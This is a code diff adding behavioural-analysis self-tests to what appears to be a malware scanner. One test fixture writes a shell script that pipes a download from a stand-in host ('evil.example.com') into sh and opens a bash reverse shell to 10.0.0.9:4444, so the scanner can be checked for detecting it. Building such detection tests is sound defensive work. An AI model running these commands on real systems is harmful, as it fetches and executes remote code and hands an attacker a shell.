@@ -130,6 +130,35 @@ def run_selftest() -> int:
               any(f.name == "SelfTest-Marker" for f in findings),
               str(sorted({f.name for f in findings})))
 
+        # -- behavioural analysis ------------------------------------------------------
+        evil_sh = workdir / "evil.sh"
+        evil_sh.write_text(
+            "#!/bin/sh\n"
+            "curl -fsSL http://evil.example.com/x.sh | sh\n"
+            "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1\n"
+        )
+        findings = scanner.scan_file(evil_sh)
+        check("behaviour: pipe-to-shell + reverse shell detected",
+              any(f.kind == "behavior" and f.severity == "high" for f in findings),
+              str(sorted({f.name for f in findings})))
+
+        clean_py = workdir / "clean.py"
+        clean_py.write_text("def main():\n    print('hello')\n\nmain()\n")
+        findings = scanner.scan_file(clean_py)
+        check("behaviour: clean python not flagged",
+              not any(f.kind == "behavior" for f in findings),
+              str(sorted({f.name for f in findings})))
+
+        from .samples import SUSPICIOUS_PE_DLLS, build_sample_pe
+
+        pe = workdir / "suspicious.exe"
+        pe.write_bytes(build_sample_pe(SUSPICIOUS_PE_DLLS))
+        findings = scanner.scan_file(pe)
+        check("behaviour: suspicious PE import table detected",
+              any(f.kind == "behavior" and "injection" in f.name.lower()
+                  for f in findings),
+              str(sorted({f.name for f in findings})))
+
     finally:
         shutil.rmtree(workdir, ignore_errors=True)
 
